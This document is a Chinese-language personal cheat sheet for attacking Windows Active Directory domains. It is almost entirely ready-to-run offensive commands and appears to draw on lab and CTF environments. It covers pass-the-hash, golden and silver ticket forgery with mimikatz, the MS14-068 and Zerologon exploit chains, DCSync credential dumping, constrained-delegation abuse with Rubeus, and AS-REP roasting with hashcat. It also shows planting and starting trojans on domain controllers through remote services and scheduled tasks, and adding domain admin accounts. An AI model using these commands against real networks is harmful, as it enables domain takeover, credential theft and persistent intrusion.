[干货 | 域内敏感信息搜集](https://mp.weixin.qq.com/s/nFOAb__c162gMhve3MEh_Q)
[横向移动之 PTH、PPT、PTK](https://mp.weixin.qq.com/s/uWuNqKYloTQCifKjsXMB2Q)
[横向移动-域控提权](https://mp.weixin.qq.com/s/mNYJ0s5HahBUewWqDwF1Fg)

## 信息收集

```shell
# -- adfind信息收集
net time /domain # 判断当前主机是否在域内 -- \\WIN-A46BVNA4HEK.tide1.org,  域主机为 WIN-A46BVNA4HEK
net user /domain
获取域内用户的详细信息：
wmic useraccount get /all

net group "domain controllers" /domain # 查看域控 OWA$
ping OWA # 域控主机即可获得域控IP
# 查看所有域成员计算机列表
net group "domain computers" /domain
# 查看域管理员, 看到管理员后 meterpreter > ps , migrate xxx 偷令牌
net group "domain admins" /domain
# 登陆本机的域管理员
net localgroup administrators /domain
# 查看域成员 假设域为god
net view /domain:god  # tode.org则写tide
# 查看 当前用户 的域用户组, -- 检查能不能 DCSync 攻击
net user %username% /domain
# 当前计算机名
hostname
# 查看域控列表
beacon> net dclist

# 三种情况
##1. 存在域，但当前用户不是域用户，提示说明权限不够
##2. 存在域，并且当前用户是域用户
##3. 当前网络环境为工作组，不存在域
```

- [adfind收集信息](./domain/90_tools.md)
- sharphound 查看收集的信息, cs偷个token, 或 Inject进程, 再执行
- [域用户枚举_爆破-kerberos](#域用户枚举_爆破-kerberos)

```sh
# cs
ps # 查看进程找到域管理员的进程
steal_token 1400 # GUI操作也可
shell dir \\OWA\C$
# 清除 token 后就无法访问域控主机
rev2self #还原进程
shell dir \\OWA\C$ # 提示无权限
# 域管凭证制作Token
make_token GOD\Administrator mac1234!
shell dir \\OWA\C$ # 成功访问域控
pth GOD\Administrator e97afaff5812d7cc281147091ebb4dc7 # 域管理员哈希传递, 然后访问域控
```

## 域维护命令

```sh

gpmc.msc # 组策略

net user administrator * # 修改管理员密码
net user aa pass /add /domain # 添加账户
net localgroup "domain admins" aa /add /domain # 添加域控管理员
# net user aa # 查看一下
net localgroup administrators domain\user /add # 添加用户到管理员
# 本地登录 .\admin
klist # 看已有票据
klist purge # 清空票据
```

## 域攻击

### 1.PTH 攻击

```sh
dir \\WIN-3IFR5080HJG.cc.com/\c$
copy shell.exe \\WIN-3IFR5080HJG.cc.com/\c$ /y
```

```sh
# kali 中ping域控要 vi /etc/resolv.conf
domain localdomain
search localdomain
nameserver 192.168.80.100
ping cc.com

msfconsole
search smb psexec
use 112 # exploit/windows/smb/psexec

set rhsots 192.168.80.100
set smbdomain cc
set smbuser administrator
set smbpass 10c7c7894091834u1074eefddcef89ed79ec9f
# 可以设置 payload 攻击时反弹也可不设置
```

### 2.黄金票据

需要获取

1. krbtst
2. hash 和 sid

```sh
mimikatz伪造账号
Dir \\域控计算机.xy.com\c$
Dir \\wn-li5mf2.xy.com\c$

mimikatz.exe "kerberos::golden /user:xyz /domain:cc /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt" exit
klist
psexec.exe \\WIN-3IFR5080HJGS.cc.com cmd.exe
```

### 3.白银票据

需要用到的条件:

1. dc 的 ip 地址
2. 域的 sid
3. 域控机的 hash
4. 伪造票据

```sh
# 获取域控 hash
mimikatz.exe "log res2.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 伪造白银票据
mimikatz.exe "kerberos::golden /user:xyz /domain:cc /sid:DOMAINSID /target:WIN-3IFR5080HJGS.cc.com /service:cifs /rc4:039f0efddcab03 /ptt" exit # target: 域控主机, rc4是域控机的 ntlm 值, mimikatz中找到 WIN-3IFR5080HJGS$
```

### 4.MS14-068(KB3011780)

[L1](https://mp.weixin.qq.com/s/tTuH3_YY_C0AuPSLfo8mTQ) [L2](https://www.freebuf.com/articles/web/340783.html)

```sh
klist purge # 清空票据
dir \\WIN-A46BVNA4HEK\c$
MS14-068.exe -u xyz@cc.com -p pwd123 -s <sid> -d WIN-3IFR5080HJGS # -d 域控
mimikatz.exe "kerberos::ptc TGT_cc@cc.com.ccache" exit           # 导入证书
```

### 5.zerologon CVE-2020-1472

1. mimikatz - 受限:需要在子域上使用

```sh
# 检测
lsadump::zerologon /target:192.168.61.129 /account:WIN-A46BVNA4HEK$
# 攻击
lsadump::zerologon /target:192.168.61.129 /account:WIN-A46BVNA4HEK$ /exploit
```

python 方式 - 不受限

```sh
# 测试
proxychains python3 zerologon_tester.py WIN-3IFR5080HJGS 192.168.80.100

# 置空密码
proxychains python3 set_empty_pw.py WIN-3IFR5080HJGS 192.168.80.100
## 方式2 proxychains python3 cve-2020-1472-exploit.py -t 192.168.61.129 -n WIN-A46BVNA4HEK
# 使用空密码dump域控上的hash
proxychains python3 secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'cc.com/WIN-3IFR5080HJGS$@192.168.80.100'
proxychains python3 secretsdump.py 'cc.com/WIN-3IFR5080HJGS$@192.168.80.100' -no-pass

proxychains python3 wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:a803cf45d87009c404eb89df4b1ae94c cc/administrator@192.168.80.100

# 获取计算机账号原始 hash
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
lget system.save
lget sam.save
lget security.save
del /f system.save
del /f sam.save
del /f security.save

# 获取计算机账号的原始 hash
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
# 将该原始计算机帐户哈希还原
python3 reinstall_original_pw.py WIN-3IFR5080HJGS 192.168.80.100 bc6d65e89c2dcdb1996a09d6e1f0083f
"""
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e3b042707eda06c25e25766ec329fcd9 # 原hash
"""
# 查看WIN-3IFR5080HJGS账号的hash，已成功还原
python3 secretsdump.py cc.com/administrator:123.com@192.168.80.100 -just-dc-user 'WIN-3IFR5080HJGS$'
# 验证2 proxychains impacket-secretsdump -no-pass -just-dc xiyou.dayu.com/XIYOU\$@10.10.3.6
```

### 6.本地用户提权再深入

hotpotato
DAY36 内网域渗透 「更新中」.mp4

## 提权

```sh
wmic qfe get hotfixid | findstr KB3011780 # 无补丁  则 ms14-068 提权
```

## 攻击

```shell
# PSTools 使用哈希传递(PTH)攻击 https://mp.weixin.qq.com/s/6BYAeo-5I1XMejyC5ec1pw
PsExec.exe \\192.168.52.138 -u god\administrator -p hongrisec@2022 -s cmd #成功，拿下域控了。
# impact: pip install impacket, win下pyexec用对应的py文件 python psexec.py xxxxxxx
psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.138 #成功，拿下域控了。
psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.141 #成功，拿下域控了。
# impact: 连接cmd
proxychains python3 wmiexec.py 'administrator:123qwe!ASD@192.168.93.20'
# smbclient 上传文件
proxychains smbclient //192.168.93.20/c$ -U administrator%password
smb > put mimikatz.exe # 上传文件

# msf meterpreter
meterpreter > getsystem
meterpreter > getuid
meterpreter > ps     # 非system时, 查看system权限进程，迁移
meterpreter > migrate 216
meterpreter > load kiwi  # 读取密码, 如果是64位的迁移到64位进程才能看明文
meterpreter > getsystem
meterpreter > creds_kerberos

# msf incognito https://mp.weixin.qq.com/s/iPv5sT50orqW79SmbVaFEQ
use incognito      //进入incognito模块
list_tokens -u    //列出令牌
impersonate_token "WUHANKQ\Administrator"    //选择要窃取的账号
#验证权限
shell
chcp 65001      //活动代码页字符为UTF-8编码
whoami

# mimikatz
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > log.log


win7共享给域控
copy c:\phpstudy\srn7final.exe \\192.168.52.138\c$
设置计划任务启动木马
schtasks /create /tn "test123456" /tr C:\srn7final.exe /sc once /st 14.25 /S 192.168.52.138 /RU System /u administrator /p "hongrisec@2021"
```

### shadow-credentials

[Link](https://zhuanlan.zhihu.com/p/581451146)

条件: 以下账户拥有 msDS-KeyCredentialLink 属性的写入权限：

- 域管理员账户
- Key Admins 组中的账户
- Enterprise Key Admins 组中的账户
- 对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户
- 机器账户对自身的 msDS-KeyCredentialLink 属性拥有写入权限

### DCSync 攻击

[DCSync](http://www.malabis.site/2022/11/12/春秋云镜-Initial/#横向移动)

DCSync 攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：

- Administrators 组内的用户
- Domain Admins 组内的用户
- Enterprise Admins 组内的用户
- ACL_ADMIN组 有WriteDACL权限
- 域控制器的计算机帐户
- 即：默认情况下域管理员组具有该权限。所以在域渗透中拿到域管理员账号就可以变相拿到整个域的控制权限。

```sh
meterpreter > load kiwi
meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
# 拿到hash后 通过哈希传递 拿到域控
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```

#### 添加 DCSync 权限, 见 春秋云境——Exchange/Delivery
```sh
# 方式一
proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :0beff597ee3d7025627b2d9aa015bf4c -action write -rights DCSync -principal Zhangtong -target-dn 'DC=xiaorang,DC=lab' -dc-ip 172.22.3.2
# 方式二
powershell -command "cd C:/Users/benbi/Desktop/; Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity 'DC=xiaorang,DC=lab' -PrincipalIde Zhangtong -Rights DCSync -Verbose"
# 完整的 Add-DomainObjectAcl -TargetIdentity 'DC=xiaorang,DC=lab' -PrincipalIdentity chenglei -Rights DCSync -Verbose

# 导出域内hash
proxychains python3 secretsdump.py xiaorang.lab/chenglei:Xt61f3LBhg1@172.22.13.6 -just-dc
```

### DC Takeover

[Ichunqiu 云境 —— Tsclient Writeup](https://mp.weixin.qq.com/s/1VDwjl_fhpZOKUy5-ZHCTQ)

### mimikatz PTH 传递攻击

```sh
# pth 传递弹出cmd
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:g1ts /ntlm:19b241fc247a06034210b12ae3aca2d9"
# 本地 /domain:. 如果有域要填好
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:. /ntlm:ef39e54205b68e286a65bbe69d2dab92 /run:mstsc.exe /restrictedadmin" "exit"
mimikatz.exe sekurlsa::pth /user:fuwuqi /domain:172.16.235.6 /ntlm:f9272c84db38a009439ba30fb23ecb2d /run:mstsc.exe /restrictedadmin
# pth 读取数据
proxychains crackmapexec smb 172.22.8.15 -u WIN2016$ -H290b14ec023182beeb4890dbe5b9774b -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
# pth 攻击
python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.32 "whoami"
python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
```

pth 连接后上传马

```sh
copy 4444.exe \\192.168.3.32\c$\  # 上传木马到目标机器中
sc \\192.168.3.32 create bindshell binpath= "c:\4444.exe" # 创建shell服务并绑定文件
sc \\192.168.3.32 start bindshell # 启动bindshell服务
```

### pth 远程桌面登录

```sh
# mimikatz
privilege::debug
sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d "/run:mstsc.exe /restrictedadmin"
# freerdp
xfreerdp /u:administrator /p:test123! /v:192.168.62.136 /cert-ignore
xfreerdp /u:administrator /pth:d25ecd13fddbb542d2e16da4f9e0333d /v:192.168.62.136 /cert-ignore
```

### 约束委派攻击

[1](https://mp.weixin.qq.com/s/O2LC0Qk55AAOqLGTJmzISg)
[2](https://zhuanlan.zhihu.com/p/581577873)

```bash
meterpreter > load kiwi
meterpreter > creds_all
```

约束委派攻击

- 1. 通过 Rubeus 申请机器账户 MSSQLSERVER 的 TGT

```bash
Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:<NTLM> /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
```

- 2. 然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中

```bash
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjC....==
```

- 3. LDAP 服务具有 DCSync 权限，导出域内用户的 Hash

```bash
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
    kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
# 获得域管理员哈希 1a19251fbd935969832616366ae3fe62
```

- 4. WMI 横向 登录域控

```
python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
```

### 域用户枚举\_爆破 Kerberos

[爆破 Kerberos](http://www.fzwjscj.xyz/index.php/archives/51/)

```sh
# 域用户枚举  https://github.com/ropnop/kerbrute
./kerbrute_linux_amd64 userenum --dc 172.22.6.12 -d xiaorang.lab user_name.txt -t 10
```

- AS-REPRoasting
  对于域用户，如果设置了选项 Do not require Kerberos preauthentication(不要求 Kerberos 预身份认证)，此时向域控制器的 88 端口发送 AS-REQ 请求，对收到的 AS-REP 内容重新组合，能够拼接成"Kerberos 5 AS-REP etype 23"(18200)的格式，接下来可以使用 hashcat 或是 john 对其破解，最终获得该用户的明文口令

```sh
# 查找未设置预认证的账号
proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/
```

得到两个账号 wenshao@xiaorang.lab 、zhangxin@xiaorang.lab

```sh
$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:b6c410706b5e96c693b2fc61ee1064c3$2dc9fbee784e7997333f30c6bc4298ab5752ba94be7022e807af418c11359fd92597e253752f4e61d2d18a83f19b5c9df4761e485853a3d879bcf7a270d6f846683b811a80dda3809528190d7f058a24996aff13094ff9b32c0e2698f6d639b4d237a06d13c309ce7ab428656b79e582609240b01fb5cd47c91573f80f846dc483a113a86977486cecce78c03860050a81ee19921d3500f36ff39fa77edd9d5614cf4b9087d3e42caef68313d1bb0c4f6bc5392943557b584521b305f61e418eb0f6eb3bf339404892da55134cb4bf828ac318fe00d68d1778b7c82caf03b65f1938e54ed3fa51b63cdb2994
$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:971802b84ce99050ad3c5f49d11fd0b7$6c1be075c3cf2a7695529de2ebbf39c5ec7e5326c9d891dac2107b239892f76befe52c860e4e1e2ff6537a5765a6bcb6b8baca792d60765ac0bbe1b3c5e59f3ec51b7426636a437d5df12130eb68d9b17ef431455415671c7331a17ce823e28cc411677bed341d3fceefc3451b8b232ea6039661625a5c793e30c4d149b2ed9d2926e9d825b3828744ebce69e47746994c9a749ceeb76c560a1840bc74d2b9f301bb5b870c680591516354460dab2238e7827900ed80320dd3a6f46874b1bc8a3a68aea7bd11d0683ec94103f59d9511691090928e98d0d8978f511e71fd9db0067fa0d450c120f3726918d7

# 使用hashcat解密
hashcat -m 18200 --force -a 0 '$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:b6c410706b5e96c693b2fc61ee1064c3$2dc9fbee784e7997333f30c6bc4298ab5752ba94be7022e807af418c11359fd92597e253752f4e61d2d18a83f19b5c9df4761e485853a3d879bcf7a270d6f846683b811a80dda3809528190d7f058a24996aff13094ff9b32c0e2698f6d639b4d237a06d13c309ce7ab428656b79e582609240b01fb5cd47c91573f80f846dc483a113a86977486cecce78c03860050a81ee19921d3500f36ff39fa77edd9d5614cf4b9087d3e42caef68313d1bb0c4f6bc5392943557b584521b305f61e418eb0f6eb3bf339404892da55134cb4bf828ac318fe00d68d1778b7c82caf03b65f1938e54ed3fa51b63cdb2994' rockyou.txt
```

## Tool

### Rubeus

Rubeus 是用于测试 Kerberos 的利用工具。

Rubeus kerberoast 查看哪些域用户注册了 SPN，也为后续 Kerberoasting 做准备：

```sh
.\Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
# 配合使用DFSCoerce强制触发回连到win19并且获取到DC01的TGT
python3 dfscoerce.py -u 'win19$' -hashes :917234367460f3f2817aa4439f97e636 -d xiaorang.lab win19 172.22.4.7
```

## net use 映射磁盘

```bash
net use P: /del
net use P: \\168.1.1.0\zhq3211
net use P: /del
net use P: \\Name\zhq3211
```

## 票据

### TGT（黄金票据）

[Link](https://blog.csdn.net/lza20001103/article/details/127113346)

黄金票据影响整个域上的所有服务的
黄金票据伪造条件
制作金票的条件：

域名称

- 域的 SID 值
- 域 KRBTGT 账号密码 HASH
- 伪造用户名，可以是任意的
- 利用步骤：

域名称 shell whoami

- 域的 SID 值 shell whoami /all
- 域 KRBTGT 账号密码 HASH
- mimikatz lsadump::dcsync /user:krbtgt@god.org (de1ay.com 是一个域名)
- 这条命令可以是域内的用户就执行的了，不需要管理员权限，我们可以伪造票据，得到域控的权限从而获取整个域内的权限

利用 cs 内置的模块（黄金票据伪造）

- 设置伪造的用户，域名称，域 SID，域内普通用户的 HASH 值，进行 build

# Tools

## impacket/wmiexec.py

```sh
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 lget {file}                 - downloads pathname to the current local dir
 ! {cmd}                    - executes a local shell cmd
```

# Article

rw_domain_域渗透 - 域控使用组策略下发文件并执行.rar
[域内定位个人 PC 的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)
[内网域渗透系列教程](https://www.bilibili.com/video/BV1xb4y1y7ju/)
[内网域渗透之常用提权](https://www.cnblogs.com/first-kiss/articles/16213182.html)
[横向移动-域控提权](https://mp.weixin.qq.com/s/_g0WiGu045GCqhN3m2bsxA)
[以攻促防丨霄壤实验室安全研究员亲传「如何自己伪造kerberos票据」](https://mp.weixin.qq.com/s/_zQZ3uRfAHB_6_ww5gT8Ew)
[内网（笔记）-域内横向移动-续2 SPN工具](https://mp.weixin.qq.com/s/vMCVrAiesYibYCMbvJeAwg)
## Todo

6-项目六完整的内网域渗透_10metasploit域内主机分析和整理【瑞客论坛 www.ruike1.com】.mp4
6-项目六完整的内网域渗透_11metasploit开启代理跨路由使用proxychaninnmap扫描【瑞客论坛 www.ruike1.com】.mp4
6-项目六完整的内网域渗透_12metasploit永恒之蓝ms17_010的使用【瑞客论坛 www.ruike1.com】.mp4
6-项目六完整的内网域渗透_13metasploitms14-068（CVE-2014-6324）普通用户提权到域控【瑞客论坛 www.ruike1.com】.mp4
6-项目六完整的内网域渗透_14metasploit生成正向攻击载荷获取域控系统权限【瑞客论坛 www.ruike1.com】.mp4
6-项目六完整的内网域渗透_15metasploit获取域控登录凭证NTML明文【瑞客论坛 www.ruike1.com】.mp4
6-项目六完整的内网域渗透_16metasploit开启域控远程端终并登录到桌面【瑞客论坛 www.ruike1.com】.mp4
6-项目六完整的内网域渗透_17metasploit域控权限维持制作黄金票据访问dc域控【瑞客论坛 www.ruike1.com】.mp4
7-项目七 渗透有防护的内网域_23 mimikatz pth 登录域控【瑞客论坛 www.ruike1.com】.mp4
7-项目七 渗透有防护的内网域_24 破解域控NTLM并登录域控【瑞客论坛 www.ruike1.com】.mp4
项目九40内网多域渗透利用mimikatz导出域控所有用户账号和hash【瑞客论坛 www.ruike1.com】.mp4
